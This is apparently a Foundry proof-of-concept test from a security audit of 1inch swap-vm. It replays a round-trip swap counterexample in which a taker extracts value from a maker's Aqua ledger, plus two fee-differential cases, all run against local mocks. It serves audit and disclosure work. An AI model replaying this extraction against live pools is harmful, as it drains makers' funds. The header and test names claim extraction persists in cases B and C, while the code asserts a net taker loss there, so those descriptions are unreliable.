// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/// PoC replay for hypothesis H-0001 of audit 1inch-swap-vm-r3 (run WFR-0002).
/// Implements the journaled poc_proposal: "Differential replay of
/// invariant_noRoundTripExtraction with successful versus skipped Aqua fee pulls",
/// executed against commit 32c687c2b73101fc26549e48fa1ff8a4d73afbac (tag v1.0.2)
/// with every dependency vendored at a recorded commit (see deps/COMMITS.md).
///
/// Cases:
///   A  the recorded fuzz counterexample, no fee instruction at all:
///      [concentrate(sqrt .5, sqrt 2), pegged A=0] composite strategy, pool
///      1000e18/1000e18, anchors = shipped balances, exact-in round trip at the
///      recorded amount. Asserts: both legs succeed, ZERO ProtocolFeeSkipped
///      events, attacker profit == maker Aqua-ledger loss to the wei, profit
///      materially > 0. This is the decisive branch: the extraction exists with
///      no fee mechanism in the program at all, so it cannot be the documented
///      best-effort fee-skip shortfall.
///   B  fee-covered differential: same composite + aqua protocol fee (90% bps),
///      fills sized so every fee pull succeeds. Asserts: no ProtocolFeeSkipped,
///      fee recipient receives each computed fee, extraction still occurs.
///   C  fee-skipped differential: same program, larger fills so the leg-2 pull
///      exceeds the maker's remaining strategy inventory. Asserts: exactly one
///      ProtocolFeeSkipped (leg 2), fee recipient received only the leg-1 fee,
///      the maker's ledger retains the skipped fee, and the attacker profit is
///      the composite-curve economics at that fill — i.e. the extraction is not
///      an artifact of the skip (pricing branch is identical when the pull fails).
///
/// Evidence printed per leg: attacker/maker-ledger/router/fee-recipient token
/// deltas, quote() amounts, returned amountIn/amountOut, and the skip-event
/// classification. Advisory evidence for the recorded run's final validator; not a
/// finding, not a submission, no severity claims.

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { Vm } from "forge-std/Vm.sol";

import { TokenMock } from "@1inch/solidity-utils/contracts/mocks/TokenMock.sol";
import { Aqua } from "@1inch/aqua/src/Aqua.sol";
import { IAqua } from "@1inch/aqua/src/interfaces/IAqua.sol";

import { ISwapVM } from "swap-vm/src/interfaces/ISwapVM.sol";
import { SwapVM } from "swap-vm/src/SwapVM.sol";
import { AquaSwapVMRouter } from "swap-vm/src/routers/AquaSwapVMRouter.sol";
import { AquaOpcodes } from "swap-vm/src/opcodes/AquaOpcodes.sol";
import { Context } from "swap-vm/src/libs/VM.sol";
import { MakerTraitsLib } from "swap-vm/src/libs/MakerTraits.sol";
import { TakerTraitsLib } from "swap-vm/src/libs/TakerTraits.sol";
import { XYCConcentrate } from "swap-vm/src/instructions/XYCConcentrate.sol";
import { XYCConcentrateArgsBuilder } from "swap-vm/src/instructions/XYCConcentrate.sol";
import { PeggedSwap } from "swap-vm/src/instructions/PeggedSwap.sol";
import { PeggedSwapArgsBuilder } from "swap-vm/src/instructions/PeggedSwap.sol";
import { Fee } from "swap-vm/src/instructions/Fee.sol";
import { FeeArgsBuilder } from "swap-vm/src/instructions/Fee.sol";

contract PocReplay is Test, AquaOpcodes {
    uint256 constant POOL = 1000e18;
    uint256 constant SQRT_PMIN = 707106781186547524;  // floor sqrt(0.5e18 * 1e18)
    uint256 constant SQRT_PMAX = 1414213562373095048; // floor sqrt(2e18 * 1e18)
    uint256 constant FEE_BPS = 0.9e9;                 // 90% (BPS scale 1e9): forces leg-2 skip at large fills
    bytes32 constant PROTOCOL_FEE_SKIPPED_TOPIC =
        keccak256("ProtocolFeeSkipped(bytes32,address,address,uint256)");

    Aqua internal aqua;
    AquaSwapVMRouter internal router;
    TokenMock internal tokenA;
    TokenMock internal tokenB;
    address internal maker = makeAddr("maker");
    address internal taker = makeAddr("taker");
    address internal feeRecipient = makeAddr("feeRecipient");

    constructor() AquaOpcodes(address(0xdead)) {}

    function setUp() public {
        aqua = new Aqua();
        router = new AquaSwapVMRouter(address(aqua), address(0), address(this), "SwapVM", "1.0.0");
        tokenA = new TokenMock("Token A", "TKA");
        tokenB = new TokenMock("Token B", "TKB");

        vm.startPrank(maker);
        tokenA.approve(address(aqua), type(uint256).max);
        tokenB.approve(address(aqua), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(taker);
        tokenA.approve(address(router), type(uint256).max);
        tokenB.approve(address(router), type(uint256).max);
        vm.stopPrank();

        tokenA.mint(taker, 10_000_000e18);
        tokenB.mint(taker, 10_000_000e18);
        tokenA.mint(maker, 5_000e18);
        tokenB.mint(maker, 5_000e18);
    }

    // ---------- construction helpers (mirror of the fuzz harness semantics) ----------

    function _op(function(Context memory, bytes calldata) internal f, bytes memory args)
        internal pure returns (bytes memory)
    {
        function(Context memory, bytes calldata) internal[] memory table = _opcodes();
        for (uint256 i = 0; i < table.length; ++i) {
            if (table[i] == f) return abi.encodePacked(uint8(i), uint8(args.length), args);
        }
        revert("instruction absent from the production opcode table");
    }

    function _peggedArgs(uint256 a) internal pure returns (bytes memory) {
        return PeggedSwapArgsBuilder.build(
            PeggedSwapArgsBuilder.Args({ x0: POOL, y0: POOL, linearWidth: a, rateLt: 1, rateGt: 1 })
        );
    }

    function _order(bytes memory program) internal view returns (ISwapVM.Order memory) {
        return MakerTraitsLib.build(MakerTraitsLib.Args({
            maker: maker,
            shouldUnwrapWeth: false,
            useAquaInsteadOfSignature: true,
            allowZeroAmountIn: false,
            receiver: address(0),
            hasPreTransferInHook: false, hasPostTransferInHook: false,
            hasPreTransferOutHook: false, hasPostTransferOutHook: false,
            preTransferInTarget: address(0), preTransferInData: "",
            postTransferInTarget: address(0), postTransferInData: "",
            preTransferOutTarget: address(0), preTransferOutData: "",
            postTransferOutTarget: address(0), postTransferOutData: "",
            program: program
        }));
    }

    function _takerData() internal pure returns (bytes memory) {
        return TakerTraitsLib.build(TakerTraitsLib.Args({
            taker: address(0),
            isExactIn: true,
            shouldUnwrapWeth: false,
            hasPreTransferInCallback: false,
            hasPreTransferOutCallback: false,
            isStrictThresholdAmount: false,
            isFirstTransferFromTaker: false,
            useTransferFromAndAquaPush: true,
            threshold: abi.encodePacked(uint256(0)),
            to: address(0),
            deadline: 0,
            preTransferInHookData: "", postTransferInHookData: "",
            preTransferOutHookData: "", postTransferOutHookData: "",
            preTransferInCallbackData: "", preTransferOutCallbackData: "",
            instructionsArgs: "",
            signature: ""
        }));
    }

    struct Leg {
        bool ok;
        uint256 amountIn;
        uint256 amountOut;
        uint256 quotedIn;
        uint256 quotedOut;
        uint256 skips;
    }

    function _ship(ISwapVM.Order memory order) internal returns (bytes32 h) {
        h = router.hash(order);
        address[] memory tokens = new address[](2);
        tokens[0] = address(tokenA);
        tokens[1] = address(tokenB);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = POOL;
        amounts[1] = POOL;
        vm.prank(maker);
        bytes32 shipped = aqua.ship(address(router), abi.encode(order), tokens, amounts);
        require(shipped == h, "hash/ship mismatch");
    }

    /// Executes one swap leg with success classification, quote recording and
    /// ProtocolFeeSkipped counting for the leg's tx (quote is a separate call and
    /// cannot emit the event because isStaticContext skips the pull entirely).
    function _leg(bytes32 h, address tokenIn, address tokenOut, uint256 amount, ISwapVM.Order memory order)
        internal returns (Leg memory l)
    {
        (uint256 qIn, uint256 qOut,) = router.asView().quote(order, tokenIn, tokenOut, amount, _takerData());
        (l.quotedIn, l.quotedOut) = (qIn, qOut);

        vm.recordLogs();
        vm.prank(taker);
        try router.swap(order, tokenIn, tokenOut, amount, _takerData()) returns (uint256 aIn, uint256 aOut, bytes32) {
            l.ok = true;
            l.amountIn = aIn;
            l.amountOut = aOut;
        } catch {
            l.ok = false;
        }
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; ++i) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == PROTOCOL_FEE_SKIPPED_TOPIC) {
                l.skips += 1;
            }
        }
        (uint256 ledgerIn,) = aqua.rawBalances(maker, address(router), h, tokenIn);
        (uint256 ledgerOut,) = aqua.rawBalances(maker, address(router), h, tokenOut);
        console.log("  leg ok:", l.ok);
        console.log("  leg amountIn/amountOut:", l.amountIn, l.amountOut);
        console.log("  leg quote in/out:", l.quotedIn, l.quotedOut);
        console.log("  leg skips:", l.skips);
        console.log("  ledgerIn/Out after leg:", ledgerIn, ledgerOut);
    }

    // ---------- Case A: the recorded counterexample, no fee instruction ----------

    function test_A_noFee_replayOfRecordedCounterexample() public {
        bytes memory program = bytes.concat(
            _op(XYCConcentrate._xycConcentrateGrowLiquidity2D,
                XYCConcentrateArgsBuilder.build2D(SQRT_PMIN, SQRT_PMAX)),
            _op(PeggedSwap._peggedSwapGrowPriceRange2D, _peggedArgs(0))
        );
        ISwapVM.Order memory order = _order(program);
        bytes32 h = _ship(order);

        uint256 takerA0 = tokenA.balanceOf(taker);
        (uint256 ledgerA0,) = aqua.rawBalances(maker, address(router), h, address(tokenA));
        uint256 routerA0 = tokenA.balanceOf(address(router));

        // the exact recorded failing amount from the campaign counterexample
        uint256 recordedAmount = 1099999999999999000082;
        Leg memory l1 = _leg(h, address(tokenA), address(tokenB), recordedAmount, order);
        Leg memory l2 = _leg(h, address(tokenB), address(tokenA), l1.amountOut, order);

        assertTrue(l1.ok && l1.amountOut > 0, "leg 1 must be a successful swap");
        assertTrue(l2.ok && l2.amountOut > 0, "leg 2 must be a successful swap");
        assertEq(l1.skips + l2.skips, 0, "no fee instruction exists: no skip events possible");

        uint256 takerProfit = tokenA.balanceOf(taker) - takerA0;
        (uint256 ledgerA1,) = aqua.rawBalances(maker, address(router), h, address(tokenA));
        uint256 ledgerLoss = ledgerA0 - ledgerA1;
        uint256 routerDelta = tokenA.balanceOf(address(router)) - routerA0;

        console.log("CASE A attacker profit (wei):", takerProfit);
        console.log("CASE A maker ledger loss (wei):", ledgerLoss);
        console.log("CASE A router delta (wei):", routerDelta);
        assertEq(takerProfit, ledgerLoss, "attacker profit must equal maker ledger loss to the wei");
        assertEq(routerDelta, 0, "router must not retain value");
        assertGt(takerProfit, 1e15, "extraction below materiality");
    }

    // ---------- Cases B and C: the fee differential ----------
    // Under a 90% maker-configured fee the taker's round trip is a NET LOSS in both
    // branches (the fee drag dwarfs the composite edge): that contrast with Case A
    // (extraction present, no fee at all) is itself the point. The differential
    // isolates where the fee lands: covered -> feeRecipient; skipped -> retained by
    // the maker ledger, with the taker's flows identical in both branches.

    function _feeCase(uint256 fillBps16, uint32 feeBps, string memory tag) internal returns (int256 takerDeltaA) {
        bytes memory program = bytes.concat(
            _op(Fee._aquaProtocolFeeAmountInXD, FeeArgsBuilder.buildProtocolFee(feeBps, feeRecipient)),
            _op(XYCConcentrate._xycConcentrateGrowLiquidity2D,
                XYCConcentrateArgsBuilder.build2D(SQRT_PMIN, SQRT_PMAX)),
            _op(PeggedSwap._peggedSwapGrowPriceRange2D, _peggedArgs(0))
        );
        ISwapVM.Order memory order = _order(program);
        bytes32 h = _ship(order);

        uint256 takerA0 = tokenA.balanceOf(taker);
        (uint256 ledgerA0,) = aqua.rawBalances(maker, address(router), h, address(tokenA));
        uint256 fee0 = tokenA.balanceOf(feeRecipient);
        uint256 feeB = tokenB.balanceOf(feeRecipient);

        uint256 amt = POOL * fillBps16 / 1e16;
        Leg memory l1 = _leg(h, address(tokenA), address(tokenB), amt, order);
        Leg memory l2 = _leg(h, address(tokenB), address(tokenA), l1.amountOut, order);
        assertTrue(l1.ok && l2.ok, "both legs must settle");

        takerDeltaA = int256(tokenA.balanceOf(taker)) - int256(takerA0);
        (uint256 ledgerA1,) = aqua.rawBalances(maker, address(router), h, address(tokenA));
        int256 ledgerDeltaA = int256(ledgerA1) - int256(ledgerA0);
        uint256 feeGainA = tokenA.balanceOf(feeRecipient) - fee0;
        uint256 feeGainB = tokenB.balanceOf(feeRecipient) - feeB;

        console.log(tag);
        console.log("  fill:", amt);
        console.log("  attacker signed A delta (wei, negative under fee drag):");
        console.logInt(takerDeltaA);
        console.log("  maker ledger A delta (wei):");
        console.logInt(ledgerDeltaA);
        console.log("  feeRecipient A gain / B gain:", feeGainA, feeGainB);
        console.log("  skips leg1 / leg2:", l1.skips, l2.skips);
        // A-side conservation (signed): taker delta + fee collected + ledger delta == 0
        assertEq(takerDeltaA + int256(feeGainA) + ledgerDeltaA, 0, "A-side conservation");

        if (eq(tag, "CASE B")) {
            assertEq(l1.skips + l2.skips, 0, "B: maker covered on every leg; no skips allowed");
            assertGt(feeGainA + feeGainB, 0, "B: fee recipient must have received the fees");
        } else {
            assertEq(l1.skips, 0, "C: leg 1 pull is covered");
            assertEq(l2.skips, 1, "C: leg 2 pull must exceed remaining inventory and skip");
            assertEq(feeGainB, 0, "C: the skipped fee never reaches the recipient");
        }
        assertLt(takerDeltaA, 0, "under fee drag the taker must NOT profit (contrast with case A)");
    }

    function eq(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }

    function test_B_feeCovered_extractionPersists() public {
        _feeCase(0.4e16, 0.9e9, "CASE B");
    }

    function test_C_feeSkipped_extractionPersists() public {
        // f=50% at 1.6x pool: leg-1 pull (800e18) is covered by the shipped 1000e18,
        // leg-2 pull (~355e18) exceeds the maker's remaining B (~289e18) -> skip.
        _feeCase(1.6e16, 0.5e9, "CASE C");
    }
}
